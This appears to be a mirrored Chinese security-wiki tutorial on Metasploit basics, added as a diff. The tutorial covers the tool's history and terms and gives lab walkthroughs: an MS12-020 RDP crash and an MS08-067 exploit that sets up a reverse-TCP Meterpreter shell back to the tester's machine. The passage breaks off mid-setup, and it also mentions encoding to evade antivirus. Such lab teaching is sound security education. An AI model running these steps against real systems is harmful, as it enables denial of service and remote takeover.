@@ -1,0 +1,1139 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh"
+  lang="zh" dir="ltr" class="no-js">
+
+<!-- Mirrored from wiki.wooyun.org/tools:metasploit by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 04 Dec 2015 02:58:29 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <title>tools:metasploit [WooYun WiKi]</title>
+  <script>(function(H){H.className=H.className.replace(/\bno-js\b/,'js')})(document.documentElement)</script>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <link rel="shortcut icon" href="lib/tpl/bootstrap3/images/favicon.ico" />
+<link rel="apple-touch-icon" href="lib/tpl/bootstrap3/images/apple-touch-icon.png" />
+      <link type="text/css" rel="stylesheet" href="lib/tpl/bootstrap3/assets/bootstrap/css/bootstrap.min.css" />
+    <script type="text/javascript">/*<![CDATA[*/
+    var TPL_CONFIG = {"tableFullWidth":1};
+  /*!]]>*/</script>
+  <meta name="generator" content="DokuWiki"/>
+<meta name="robots" content="noindex,nofollow"/>
+<meta name="keywords" content="tools,metasploit"/>
+<link rel="search" type="application/opensearchdescription+xml" href="http://wiki.wooyun.org/lib/exe/opensearch.php" title="WooYun WiKi"/>
+<link rel="start" href="http://wiki.wooyun.org/"/>
+<link rel="contents" href="http://wiki.wooyun.org/tools:metasploit?do=index" title="网站地图"/>
+<link rel="alternate" type="application/rss+xml" title="最近更改" href="http://wiki.wooyun.org/feed.php"/>
+<link rel="alternate" type="application/rss+xml" title="当前命名空间" href="http://wiki.wooyun.org/feed.php?mode=list&amp;ns=tools"/>
+<link rel="alternate" type="text/html" title="纯HTML" href="http://wiki.wooyun.org/_export/xhtml/tools:metasploit"/>
+<link rel="alternate" type="text/plain" title="Wiki Markup 语言" href="http://wiki.wooyun.org/_export/raw/tools:metasploit"/>
+<link rel="stylesheet" type="text/css" href="http://wiki.wooyun.org/lib/exe/css.php?t=bootstrap3&amp;tseed=6dcbf66232c3759c28d0e8f6d9cdfd22"/>
+<script type="text/javascript">/*<![CDATA[*/var NS='tools';var JSINFO = {"id":"tools:metasploit","namespace":"tools","plugin_codeprettify":{"loader_base":"\/lib\/plugins\/codeprettify\/google-code-prettify"}};
+/*!]]>*/</script>
+<script type="text/javascript" charset="utf-8" src="http://wiki.wooyun.org/lib/exe/js.php?tseed=6dcbf66232c3759c28d0e8f6d9cdfd22"></script>
+<script type="text/javascript" charset="utf-8" src="http://wiki.wooyun.org/lib/plugins/codeprettify/google-code-prettify/run_prettify.js?lang=css"></script>
+  <script type="text/javascript" src="http://wiki.wooyun.org/lib/tpl/bootstrap3/assets/bootstrap/js/bootstrap.min.js"></script>
+  <style type="text/css">
+    body { padding-top: 20px; }
+  </style>
+  <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+  <!--[if lt IE 9]>
+  <script type="text/javascript" src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+  <script type="text/javascript" src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+  <![endif]-->
+</head>
+<body class="default page-on-panel">
+  <!--[if lte IE 7 ]><div id="IE7"><![endif]--><!--[if IE 8 ]><div id="IE8"><![endif]-->
+
+  <div id="dokuwiki__site" class="container">
+    <div id="dokuwiki__top" class="site dokuwiki mode_show tpl_bootstrap3    hasSidebar">
+
+      
+      <!-- header -->
+      <div id="dokuwiki__header">
+        <nav class="navbar  navbar-default" role="navigation">
+
+  <div class="container-fluid">
+
+    <div class="navbar-header">
+
+      <button class="navbar-toggle" type="button" data-toggle="collapse" data-target=".navbar-collapse">
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+
+      <a href="http://wiki.wooyun.org/WooYun WiKi"  accesskey="h" title="[H]" class="navbar-brand"><img src="http://wiki.wooyun.org/lib/tpl/bootstrap3/images/logo.png" alt="WooYun WiKi" class="pull-left" id="dw__logo" width="20" height="20" /> <span id="dw__title" >WooYun WiKi</span></a>
+    </div>
+
+    <div class="collapse navbar-collapse">
+
+      <ul class="nav navbar-nav" id="dw__navbar">
+        <li class="active">
+  <a href="http://wiki.wooyun.org/WooYun WiKi" ><i class="glyphicon glyphicon-home"></i> Home</a></li>
+      </ul>
+
+      <div class="navbar-right">
+
+        <form action="http://wiki.wooyun.org/WooYun WiKi" accept-charset="utf-8" class="search" id="dw__search" method="get" role="search"><div class="no"><input type="hidden" name="do" value="search" /><input type="text" id="qsearch__in" accesskey="f" name="id" class="edit" title="[F]" /><input type="submit" value="搜索" class="button" title="搜索" /><div id="qsearch__out" class="ajax_qsearch JSpopup"></div></div></form>
+        <ul class="nav navbar-nav" id="dw__tools">
+  <li class="dropdown">
+    <a href="#" class="dropdown-toggle" data-toggle="dropdown" title="工具"><i class="glyphicon glyphicon-wrench"></i> <span class="hidden-lg hidden-md hidden-sm">工具</span> <span class="caret"></span></a>
+    <ul class="dropdown-menu tools" role="menu">
+
+      <!-- dokuwiki__usertools -->
+      <li class="dropdown-header"><i class="glyphicon glyphicon-user"></i> 用户工具</li>
+      
+      <li class="divider"></li>
+
+      <!-- dokuwiki__sitetools -->
+      <li class="dropdown-header"><i class="glyphicon glyphicon-cog"></i> 站点工具</li>
+      <li><a href="http://wiki.wooyun.org/tools:metasploit?do=recent"  class="action recent" accesskey="r" rel="nofollow" title="最近更改 [R]"><i class="glyphicon glyphicon-list-alt"></i> 最近更改</a></li><li><a href="http://wiki.wooyun.org/tools:metasploit?do=media&amp;ns=tools"  class="action media" rel="nofollow" title="媒体管理器"><i class="glyphicon glyphicon-picture"></i> 媒体管理器</a></li><li><a href="http://wiki.wooyun.org/tools:metasploit?do=index"  class="action index" accesskey="x" rel="nofollow" title="网站地图 [X]"><i class="glyphicon glyphicon-list"></i> 网站地图</a></li>
+      <li class="divider"></li>
+
+      <!-- dokuwiki__pagetools -->
+      <li class="dropdown-header"><i class="glyphicon glyphicon-file"></i> 页面工具</li>
+      <li><a href="http://wiki.wooyun.org/tools:metasploit?do=edit&amp;rev=1433217498"  class="action source" accesskey="v" rel="nofollow" title="显示源文件 [V]"><i class="glyphicon glyphicon-edit"></i> 显示源文件</a></li><li><a href="http://wiki.wooyun.org/tools:metasploit?do=revisions"  class="action revs" accesskey="o" rel="nofollow" title="修订记录 [O]"><i class="glyphicon glyphicon-time"></i> 修订记录</a></li><li><a href="http://wiki.wooyun.org/tools:metasploit?do=backlink"  class="action backlink" rel="nofollow" title="反向链接"><i class="glyphicon glyphicon-link"></i> 反向链接</a></li><li><a href="#dokuwiki__top"  class="action top" accesskey="t" rel="nofollow" title="回到顶部 [T]"><i class="glyphicon glyphicon-chevron-up"></i> 回到顶部</a></li>
+    </ul>
+  </li>
+</ul>
+
+        <ul class="nav navbar-nav">
+          <li>
+                      </li>
+                    <li><a href="http://wiki.wooyun.org/tools:metasploit?do=login&amp;sectok=a3845e1693337b10c6abaa01a16b0594"  class="action login" rel="nofollow" title="登录"><i class="glyphicon glyphicon-log-in"></i> 登录</a></li>        </ul>
+
+      </div>
+
+    </div>
+  </div>
+</nav>
+      </div>
+      <!-- /header -->
+
+      
+            <div id="dw__breadcrumbs">
+        <hr/>
+                        <div class="breadcrumb hidden-print"><span class="bchead">您的足迹:</span> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/tools:rfid_nfc_toolset"  class="breadcrumbs" title="tools:rfid_nfc_toolset">rfid_nfc_toolset</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/tools:software_defined_radio"  class="breadcrumbs" title="tools:software_defined_radio">software_defined_radio</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/tools:bluetooth_toolset"  class="breadcrumbs" title="tools:bluetooth_toolset">bluetooth_toolset</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/tools:wireless_toolset"  class="breadcrumbs" title="tools:wireless_toolset">wireless_toolset</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/tools:other_wireless_tools"  class="breadcrumbs" title="tools:other_wireless_tools">other_wireless_tools</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/tools:beef_xss_framework"  class="breadcrumbs" title="tools:beef_xss_framework">beef_xss_framework</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/tools:cisco_attack"  class="breadcrumbs" title="tools:cisco_attack">cisco_attack</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/tools:exploit_database"  class="breadcrumbs" title="tools:exploit_database">exploit_database</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/tools:exploit_development_tools"  class="breadcrumbs" title="tools:exploit_development_tools">exploit_development_tools</a></bdi> <span class="bcsep">•</span> <span class="curid"><bdi><a href="http://wiki.wooyun.org/tools:metasploit"  class="breadcrumbs" title="tools:metasploit">metasploit</a></bdi></span></div>
+                <hr/>
+      </div>
+      
+      <p class="pageId text-right">
+        <span class="label label-default">tools:metasploit</span>
+      </p>
+
+      <div id="dw__msgarea">
+              </div>
+
+      <main class="main row" role="main">
+
+        <!-- ********** ASIDE ********** -->
+<aside id="dokuwiki__aside" class="dw__sidebar col-sm-3 col-md-2 hidden-print">
+  <div class="content">
+    <div class="toogle hidden-lg hidden-md hidden-sm" data-toggle="collapse" data-target="#dokuwiki__aside .collapse">
+      <i class="glyphicon glyphicon-th-list"></i> 侧边栏    </div>
+    <div class="collapse in">
+            
+<h4 id="企业安全">企业安全</h4>
+<div class="level4">
+<ul>
+<li class="level1"><div class="li"><a href="http://wiki.wooyun.org/enterprise:information" class="wikilink1" title="enterprise:information">信息收集</a></div>
+</li>
+<li class="level1"><div class="li"><a href="http://wiki.wooyun.org/enterprise:server" class="wikilink1" title="enterprise:server">服务配置</a></div>
+</li>
+<li class="level1"><div class="li"><a href="http://wiki.wooyun.org/enterprise:web" class="wikilink1" title="enterprise:web">Web应用</a></div>
+</li>
+<li class="level1"><div class="li"><a href="http://wiki.wooyun.org/enterprise:tools" class="wikilink1" title="enterprise:tools">安全工具</a></div>
+</li>
+<li class="level1"><div class="li"><a href="http://wiki.wooyun.org/enterprise:defence" class="wikilink1" title="enterprise:defence">安全防御</a></div>
+</li>
+<li class="level1"><div class="li"><a href="http://wiki.wooyun.org/enterprise:pentest" class="wikilink1" title="enterprise:pentest">渗透技巧</a></div>
+</li>
+</ul>
+
+</div>
+
+<h4 id="android_安全">Android 安全</h4>
+<div class="level4">
+<ul>
+<li class="level1"><div class="li"><a href="http://wiki.wooyun.org/android:client" class="wikilink1" title="android:client">客户端</a></div>
+</li>
+<li class="level1"><div class="li"><a href="http://wiki.wooyun.org/android:system" class="wikilink1" title="android:system">系统</a></div>
+</li>
+<li class="level1"><div class="li"><a href="http://wiki.wooyun.org/android:communicate" class="wikilink1" title="android:communicate">通信</a></div>
+</li>
+<li class="level1"><div class="li"><a href="http://wiki.wooyun.org/android:server" class="wikilink1" title="android:server">服务端</a></div>
+</li>
+<li class="level1"><div class="li"><a href="http://wiki.wooyun.org/android:tools" class="wikilink1" title="android:tools">常用工具</a></div>
+</li>
+</ul>
+
+</div>
+
+<h4 id="乌云">乌云</h4>
+<div class="level4">
+<ul>
+<li class="level1"><div class="li"><a href="http://wiki.wooyun.org/wooyun:route" class="wikilink1" title="wooyun:route">乌云路由</a></div>
+</li>
+<li class="level1"><div class="li"><span class="curid"><a href="http://wiki.wooyun.org/wooyun:woobuntu" class="wikilink1" title="wooyun:woobuntu">Woobuntu</a></span></div>
+</li>
+</ul>
+
+</div>
+
+<h4 id="apt">APT</h4>
+<div class="level4">
+<ul>
+<li class="level1"><div class="li"><a href="http://wiki.wooyun.org/apt:organization" class="wikilink1" title="apt:organization">组织</a></div>
+</li>
+</ul>
+
+</div>
+
+<h4 id="find_us">Find Us</h4>
+<div class="level4">
+<ul>
+<li class="level1"><div class="li">Email: <a class="__cf_email__" href="http://wiki.wooyun.org/cdn-cgi/l/email-protection" data-cfemail="d5a2bcbebc95a2babaaca0bbfbbaa7b2">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">
+/* <![CDATA[ */!function(){try{var t="currentScript"in document?document.currentScript:function(){for(var t=document.getElementsByTagName("script"),e=t.length;e--;)if(t[e].getAttribute("data-cfhash"))return t[e]}();if(t&&t.previousSibling){var e,r,n,i,c=t.previousSibling,a=c.getAttribute("data-cfemail");if(a){for(e="",r=parseInt(a.substr(0,2),16),n=2;a.length-n;n+=2)i=parseInt(a.substr(n,2),16)^r,e+=String.fromCharCode(i);e=document.createTextNode(e),c.parentNode.replaceChild(e,c)}t.parentNode.removeChild(t);}}catch(u){}}()/* ]]> */</script>
+</div>
+</li>
+</ul>
+
+</div>
+          </div>
+  </div>
+</aside>
+
+        <!-- ********** CONTENT ********** -->
+        <article id="dokuwiki__content" class="col-sm-9 col-md-10" >
+
+          <div class="panel panel-default" > 
+            <div class="page group panel-body">
+
+                                          
+              <div class="pull-right hidden-print" data-spy="affix" data-offset-top="150" style="z-index:1024; top:10px; right:10px;">
+                <!-- TOC START -->
+<div id="dw__toc">
+<h3 class="toggle">目录</h3>
+<div>
+
+<ul class="toc">
+<li class="level1"><div class="li"><a href="#metasploit基础入门">METASPLOIT基础入门</a></div>
+<ul class="toc">
+<li class="clear">
+<ul class="toc">
+<li class="level3"><div class="li"><a href="#基础知识">1、基础知识</a></div></li>
+<li class="level3"><div class="li"><a href="#metasploit实验">2、Metasploit实验</a></div></li>
+<li class="level3"><div class="li"><a href="#meterpreter">3、Meterpreter</a></div></li>
+<li class="level3"><div class="li"><a href="#攻击载荷_msfpayload">4、攻击载荷（Msfpayload）</a></div></li>
+<li class="level3"><div class="li"><a href="#msf编码_msfencode">5、MSF编码（Msfencode）</a></div></li>
+<li class="level3"><div class="li"><a href="#辅助模块_auxiliary">6、辅助模块（Auxiliary）</a></div></li>
+<li class="level3"><div class="li"><a href="#相关资源">7、相关资源</a></div></li>
+</ul></li>
+</ul></li>
+</ul>
+</div>
+</div>
+<!-- TOC END -->
+              </div>
+
+              <!-- wikipage start -->
+              
+<p>
+﻿
+</p>
+
+<h1 class="sectionedit1" id="metasploit基础入门">METASPLOIT基础入门</h1>
+<div class="level1">
+
+</div>
+
+<h3 class="sectionedit2" id="基础知识">1、基础知识</h3>
+<div class="level3">
+<hr />
+
+</div>
+
+<h4 id="简介">1.1 简介</h4>
+<div class="level4">
+
+<p>
+Metasploit是一款开源安全漏洞检测工具，附带数百个已知的软件漏洞，并保持频繁更新。被安全社区冠以“可以黑掉整个宇宙”之名的强大渗透测试框架。
+</p>
+
+<p>
+Metasploit Framework最初是 HD Moore 个人的想法，当时他在一家安全公司工作，他于2003年10月发布了第一个基于Perl的Metasploit版本，一开始只有共11个漏洞利用程序。后来随着Spoonm帮助和加入，HD发布于2004年4月重写了该项目并发布了Metasploit2.0。此版本包括19个漏洞和超过27个payload。在这个版本之发布后不久，马特米勒（Skape）加入了Metasploit的开发团队，使得该项目日益流行，Metasploit Framework也收到来自信息安全界的大力支持，并迅速成为一个渗透测试必备的工具。
+</p>
+
+<p>
+在2004年8月HD Moore 和 Spoonm 等4名年轻人在black hat会议上首次公布了该项目，Metasploit的团队在2007年使用Ruby编程语言完全重写并发布了Metasploit3.0，这次Metasploit从Perl到Ruby的迁移历时18个月，增加超过15万行的新代码。随着3.0版本的发布，Metasploit开始被广泛的采用，在整个安全社区也受到了大幅增加的帮助和贡献。
+请输入图片描述
+</p>
+
+<p>
+在2009年秋季，Rapid7收购了Metasploit，Rapid7是一个在漏洞扫描领域的领导者公司，被收购之后，Rapid7公司允许HD建立一个团队，仅仅着重于Metasploit Framework的开发。也正由于这样，这次收购使得Metasploit Framework开始更迅速地发展。HD Moore也成为了Rapid7公司的CSO（Chief Security Officer），同时他也是Metasploit的首席架构师。
+</p>
+
+</div>
+
+<h4 id="专业术语">1.2 专业术语</h4>
+<div class="level4">
+
+<p>
+渗透攻击（Exploit）,指由攻击者或渗透测试者利用一个系统、应用或服务中的安全漏洞，所进行的攻击行为。
+</p>
+
+<p>
+攻击载荷（Payload），是我们期望目标系统在被渗透攻击之后去执行的代码。
+</p>
+
+<p>
+Shellcode，是在渗透攻击是作为攻击载荷运行的一组机器指令，通常用汇编语言编写。
+</p>
+
+<p>
+模块（Module），指Metasploit框架中所使用的一段软件代码组件，可用于发起渗透攻击或执行某些辅助攻击动作。
+</p>
+
+<p>
+监听器（Listener），是Metasploit中用来等待网络连接的组件。
+</p>
+
+</div>
+
+<h4 id="用户接口">1.3 用户接口</h4>
+<div class="level4">
+
+<p>
+终端（Msfconsole），是Metasploit框架最受欢迎的用户接口，提供与用户交互式的输入，可以用它来做任何事情。
+启动终端：在命令行里输入msfencode即可。
+</p>
+<pre class="code bash"><span class="co4">light@kali:~# </span>msfconsole
+IIIIII    dTb.dTb        _.---._
+  II     <span class="nu0">4</span><span class="st_h">'  v  '</span>B   .<span class="st_h">'&quot;&quot;.'</span><span class="sy0">/|</span>\<span class="sy0">`</span>.<span class="st0">&quot;&quot;</span><span class="st_h">'.
+  II     6.     .P  :  .'</span> <span class="sy0">/</span> <span class="sy0">|</span> \ <span class="sy0">`</span>.  :
+  II     <span class="st_h">'T;. .;P'</span>  <span class="st_h">'.'</span>  <span class="sy0">/</span>  <span class="sy0">|</span>  \  <span class="sy0">`</span>.<span class="st_h">'
+  II      '</span>T; ;P<span class="st_h">'    `. /   |   \ .'</span>
+IIIIII     <span class="st_h">'YvP'</span>       <span class="sy0">`</span>-.__<span class="sy0">|</span>__.-<span class="st_h">'
+&nbsp;
+I love shells --egypt
+&nbsp;
+&nbsp;
+Tired of typing '</span><span class="kw1">set</span> RHOSTS<span class="st_h">'? Click &amp; pwn with Metasploit Pro
+Learn more on http://rapid7.com/metasploit
+&nbsp;
+       =[ metasploit v4.10.0-2014082101 [core:4.10.0.pre.2014082101 api:1.0.0]]
++ -- --=[ 1331 exploits - 722 auxiliary - 214 post        ]
++ -- --=[ 340 payloads - 35 encoders - 8 nops             ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+&nbsp;
+msf &gt;</span></pre>
+
+<p>
+命令行（msfcli），msfcli脚本处理和其他命令工具的互操作性。
+Armitage，Metasploit框架中一个完全交互式的图形化用户接口。
+</p>
+
+</div>
+
+<h4 id="功能程序">1.4 功能程序</h4>
+<div class="level4">
+
+<p>
+MSF攻击载荷生成器（msfpayload），用于生成自己定制的shellcode、可执行代码等。
+</p>
+
+<p>
+MSF编码器（msfencode），帮助msfpayload进行编码处理，避免坏字符，以及逃避杀毒软件和IDS的检测。
+</p>
+
+</div>
+
+<h3 class="sectionedit3" id="metasploit实验">2、Metasploit实验</h3>
+<div class="level3">
+<hr />
+
+</div>
+
+<h4 id="ms12-020漏洞利用演示实验">2.1 MS12-020漏洞利用演示实验</h4>
+<div class="level4">
+
+<p>
+2.1.1 微软关于MS12-020漏洞的安全公告: 
+<a href="http://technet.microsoft.com/zh-cn/security/bulletin/ms12-020" class="urlextern" title="http://technet.microsoft.com/zh-cn/security/bulletin/ms12-020"  rel="nofollow">http://technet.microsoft.com/zh-cn/security/bulletin/ms12-020</a>
+</p>
+
+<p>
+2.1.2 实验准备工作
+</p>
+
+<p>
+1、该漏洞利用远程桌面的漏洞进行攻击，所以需要靶机xp系统打开远程桌面功能。
+</p>
+
+<p>
+2、检查确定渗透测试系统与靶机系统可以互相ping通。
+</p>
+
+<p>
+2.1.3 实验步骤
+1、渗透测试系统中，在终端输入msfconsole进入msf终端，接着在msf终端中使用search功能搜索ms12-020，发现有两个可用模块：
+</p>
+<pre class="code bash">msf <span class="sy0">&gt;</span> search ms12-020
+&nbsp;
+Matching Modules
+================
+   Name                                              Disclosure Date  Rank    Description
+   <span class="re5">----</span>                                              <span class="re5">---------------</span>  <span class="re5">----</span>    <span class="re5">-----------</span>
+   auxiliary<span class="sy0">/</span>dos<span class="sy0">/</span>windows<span class="sy0">/</span>rdp<span class="sy0">/</span>ms12_020_maxchannelids  <span class="nu0">2012</span>-03-<span class="nu0">16</span>       normal  MS12-020 Microsoft Remote Desktop Use-After-Free DoS
+   auxiliary<span class="sy0">/</span>scanner<span class="sy0">/</span>rdp<span class="sy0">/</span>ms12_020_check                               normal  MS12-020 Microsoft Remote Desktop Checker</pre>
+
+<p>
+2、使用use命令选定要利用的模块：
+</p>
+<pre class="code bash">msf <span class="sy0">&gt;</span> use auxiliary<span class="sy0">/</span>dos<span class="sy0">/</span>windows<span class="sy0">/</span>rdp<span class="sy0">/</span>ms12_020_maxchannelids
+msf auxiliary<span class="br0">&#40;</span>ms12_020_maxchannelids<span class="br0">&#41;</span> </pre>
+
+<p>
+3、查看需要填写的参数，这里需要填写靶机ip。
+</p>
+<pre class="code bash">msf auxiliary<span class="br0">&#40;</span>ms12_020_maxchannelids<span class="br0">&#41;</span> <span class="sy0">&gt;</span> show options 
+&nbsp;
+Module options <span class="br0">&#40;</span>auxiliary<span class="sy0">/</span>dos<span class="sy0">/</span>windows<span class="sy0">/</span>rdp<span class="sy0">/</span>ms12_020_maxchannelids<span class="br0">&#41;</span>:
+&nbsp;
+   Name   Current Setting  Required  Description
+   <span class="re5">----</span>   <span class="re5">---------------</span>  <span class="re5">--------</span>  <span class="re5">-----------</span>
+   RHOST                   <span class="kw2">yes</span>       The target address
+   RPORT  <span class="nu0">3389</span>             <span class="kw2">yes</span>       The target port
+&nbsp;
+msf auxiliary<span class="br0">&#40;</span>ms12_020_maxchannelids<span class="br0">&#41;</span> <span class="sy0">&gt;</span> <span class="kw1">set</span> RHOST 192.168.116.129
+RHOST =<span class="sy0">&gt;</span> 192.168.116.129</pre>
+
+<p>
+4、最后输入命令“run”，执行我们的auxiliary攻击模块：
+</p>
+<pre class="code bash">msf auxiliary<span class="br0">&#40;</span>ms12_020_maxchannelids<span class="br0">&#41;</span> <span class="sy0">&gt;</span> run
+&nbsp;
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> 192.168.116.129:<span class="nu0">3389</span> - Sending MS12-020 Microsoft Remote Desktop Use-After-Free DoS
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> 192.168.116.129:<span class="nu0">3389</span> - <span class="nu0">210</span> bytes sent
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> 192.168.116.129:<span class="nu0">3389</span> - Checking RDP status...
+<span class="br0">&#91;</span>+<span class="br0">&#93;</span> 192.168.116.129:<span class="nu0">3389</span> seems down
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Auxiliary module execution completed</pre>
+
+<p>
+5、靶机系统受到攻击后蓝屏
+</p>
+
+<p>
+<a href="http://wiki.wooyun.org/_detail/tools:p5.png?id=tools%3Ametasploit" class="media" title="tools:p5.png"><img src="http://wiki.wooyun.org/_media/tools:p5.png?w=300&amp;tok=9da908" class="media" alt="" width="300" /></a>
+</p>
+
+</div>
+
+<h4 id="ms08-067漏洞利用演示实验">2.2 MS08-067漏洞利用演示实验</h4>
+<div class="level4">
+
+<p>
+2.2.1 微软关于MS18-067漏洞的安全公告: 
+</p>
+
+<p>
+<a href="http://technet.microsoft.com/zh-cn/security/bulletin/ms08-067" class="urlextern" title="http://technet.microsoft.com/zh-cn/security/bulletin/ms08-067"  rel="nofollow">http://technet.microsoft.com/zh-cn/security/bulletin/ms08-067</a>
+</p>
+
+<p>
+2.2.2 实验步骤
+</p>
+
+<p>
+1、进入msf终端后，使用search功能搜索ms08-067，发现有一个可用模块：
+</p>
+<pre class="code bash">msf <span class="sy0">&gt;</span> search ms08-067
+&nbsp;
+Matching Modules
+================
+&nbsp;
+   Name                                 Disclosure Date  Rank   Description
+   <span class="re5">----</span>                                 <span class="re5">---------------</span>  <span class="re5">----</span>   <span class="re5">-----------</span>
+   exploit<span class="sy0">/</span>windows<span class="sy0">/</span>smb<span class="sy0">/</span>ms08_067_netapi  <span class="nu0">2008</span>-<span class="nu0">10</span>-<span class="nu0">28</span>       great  MS08-067 Microsoft Server Service Relative Path Stack Corruption</pre>
+
+<p>
+2、使用use命令选定要利用的模块：
+</p>
+<pre class="code bash">msf <span class="sy0">&gt;</span> use exploit<span class="sy0">/</span>windows<span class="sy0">/</span>smb<span class="sy0">/</span>ms08_067_netapi
+msf exploit<span class="br0">&#40;</span>ms08_067_netapi<span class="br0">&#41;</span> <span class="sy0">&gt;</span></pre>
+
+<p>
+3、接下来，light教授设置攻击载荷为基于Windows系统的Meterpreter reverse_tcp ，这个载荷在攻击之后，会从目标主机发起一个反弹连接，连接到LHOST中指定的IP地址（也就是我们俗称的反弹马）。这种反弹连接可以让你绕过防火墙的入站流量保护，或者穿透NAT网关。
+</p>
+<pre class="code bash">msf exploit<span class="br0">&#40;</span>ms08_067_netapi<span class="br0">&#41;</span> <span class="sy0">&gt;</span> <span class="kw1">set</span> PAYLOAD windows<span class="sy0">/</span>meterpreter<span class="sy0">/</span>reverse_tcp
+PAYLOAD =<span class="sy0">&gt;</span> windows<span class="sy0">/</span>meterpreter<span class="sy0">/</span>reverse_tcp</pre>
+
+<p>
+4、使用“show targets”命令让我们识别和匹配目标操作系统的类型。（大多数MSF渗透攻击模块会自动对目标系统类型进行识别，而不需要手工指定此参数，但是针对MS08-067漏洞的攻击中，通常无法正确的自动识别出系统类型。）
+</p>
+<pre class="code bash">msf exploit<span class="br0">&#40;</span>ms08_067_netapi<span class="br0">&#41;</span> <span class="sy0">&gt;</span> show targets 
+&nbsp;
+Exploit targets:
+&nbsp;
+   Id  Name
+   <span class="re5">--</span>  <span class="re5">----</span>
+   <span class="nu0">0</span>   Automatic Targeting
+   <span class="nu0">1</span>   Windows <span class="nu0">2000</span> Universal
+   <span class="nu0">2</span>   Windows XP SP0<span class="sy0">/</span>SP1 Universal
+   <span class="nu0">3</span>   Windows XP SP2 English <span class="br0">&#40;</span>AlwaysOn NX<span class="br0">&#41;</span>
+   <span class="nu0">4</span>   Windows XP SP2 English <span class="br0">&#40;</span>NX<span class="br0">&#41;</span>
+   <span class="nu0">5</span>   Windows XP SP3 English <span class="br0">&#40;</span>AlwaysOn NX<span class="br0">&#41;</span>
+   <span class="nu0">6</span>   Windows XP SP3 English <span class="br0">&#40;</span>NX<span class="br0">&#41;</span>
+   <span class="nu0">7</span>   Windows <span class="nu0">2003</span> SP0 Universal
+   <span class="nu0">8</span>   Windows <span class="nu0">2003</span> SP1 English <span class="br0">&#40;</span>NO NX<span class="br0">&#41;</span>
+   <span class="nu0">9</span>   Windows <span class="nu0">2003</span> SP1 English <span class="br0">&#40;</span>NX<span class="br0">&#41;</span>
+   <span class="nu0">10</span>  Windows <span class="nu0">2003</span> SP1 Japanese <span class="br0">&#40;</span>NO NX<span class="br0">&#41;</span>
+   <span class="nu0">11</span>  Windows <span class="nu0">2003</span> SP2 English <span class="br0">&#40;</span>NO NX<span class="br0">&#41;</span>
+   <span class="nu0">12</span>  Windows <span class="nu0">2003</span> SP2 English <span class="br0">&#40;</span>NX<span class="br0">&#41;</span>
+   <span class="nu0">13</span>  Windows <span class="nu0">2003</span> SP2 German <span class="br0">&#40;</span>NO NX<span class="br0">&#41;</span>
+   <span class="nu0">14</span>  Windows <span class="nu0">2003</span> SP2 German <span class="br0">&#40;</span>NX<span class="br0">&#41;</span>
+   <span class="nu0">15</span>  Windows XP SP2 Arabic <span class="br0">&#40;</span>NX<span class="br0">&#41;</span>
+   <span class="nu0">16</span>  Windows XP SP2 Chinese - Traditional <span class="sy0">/</span> Taiwan <span class="br0">&#40;</span>NX<span class="br0">&#41;</span>
+   <span class="nu0">17</span>  Windows XP SP2 Chinese - Simplified <span class="br0">&#40;</span>NX<span class="br0">&#41;</span>
+   ......</pre>
+
+<p>
+5、选定系统编号（TARTGET），设置靶机IP（RHOST）与本机IP（LHOST）
+</p>
+<pre class="code bash">msf exploit<span class="br0">&#40;</span>ms08_067_netapi<span class="br0">&#41;</span> <span class="sy0">&gt;</span> <span class="kw1">set</span> TARGET <span class="nu0">17</span>
+TARGET =<span class="sy0">&gt;</span> <span class="nu0">17</span>
+msf exploit<span class="br0">&#40;</span>ms08_067_netapi<span class="br0">&#41;</span> <span class="sy0">&gt;</span> <span class="kw1">set</span> RHOST 192.168.116.129
+RHOST =<span class="sy0">&gt;</span> 192.168.116.129
+msf exploit<span class="br0">&#40;</span>ms08_067_netapi<span class="br0">&#41;</span> <span class="sy0">&gt;</span> <span class="kw1">set</span> LHOST 192.168.116.128
+LHOST =<span class="sy0">&gt;</span> 192.168.116.128</pre>
+
+<p>
+6、使用“show options”命令查看当前参数设置情况：
+</p>
+<pre class="code bash">msf exploit<span class="br0">&#40;</span>ms08_067_netapi<span class="br0">&#41;</span> <span class="sy0">&gt;</span> show options 
+&nbsp;
+Module options <span class="br0">&#40;</span>exploit<span class="sy0">/</span>windows<span class="sy0">/</span>smb<span class="sy0">/</span>ms08_067_netapi<span class="br0">&#41;</span>:
+&nbsp;
+   Name     Current Setting  Required  Description
+   <span class="re5">----</span>     <span class="re5">---------------</span>  <span class="re5">--------</span>  <span class="re5">-----------</span>
+   RHOST    192.168.116.129  <span class="kw2">yes</span>       The target address
+   RPORT    <span class="nu0">445</span>              <span class="kw2">yes</span>       Set the SMB service port
